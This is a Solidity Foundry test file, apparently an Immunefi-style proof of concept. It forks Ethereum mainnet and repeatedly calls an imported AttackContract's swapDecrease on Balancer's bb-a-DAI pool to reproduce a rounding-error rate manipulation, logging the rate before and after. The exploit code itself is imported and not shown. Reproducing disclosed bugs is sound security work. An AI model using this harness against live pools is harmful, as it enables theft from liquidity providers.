// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "../../../src/Balancer/rounding-error-aug2023/AttackContract.sol";

contract BalancerPoCTest is PoC {
    AttackContract public attackContract;
    IERC20[] tokens;
    address bbaDAI = 0xfa24A90A3F2bBE5FEEA92B95cD0d14Ce709649f9;

    function setUp() public {
        // Fork from specified block chain at block
        vm.createSelectFork("https://rpc.ankr.com/eth", 17893427);

        // Deploy attack contract
        attackContract = new AttackContract();

        // Tokens to track during snapshotting
        // e.g. tokens.push(EthereumTokens.USDC);
        tokens.push(IERC20(bbaDAI));
        tokens.push(EthereumTokens.DAI);

        setAlias(address(attackContract), "Attacker");

        console.log("\n>>> Initial conditions");
    }

    function testPoolWithNoWrappedToken() public snapshot(address(attackContract), tokens) {
        // no initial funds required
        console.log("Balancer aDAI rate before:", ComposableStablePool(bbaDAI).getRate());
        for (int256 i = 0; i < 500; i++) {
            attackContract.swapDecrease(bbaDAI);
        }
        console.log("Balancer aDAI rate after: ", ComposableStablePool(bbaDAI).getRate());
    }
}
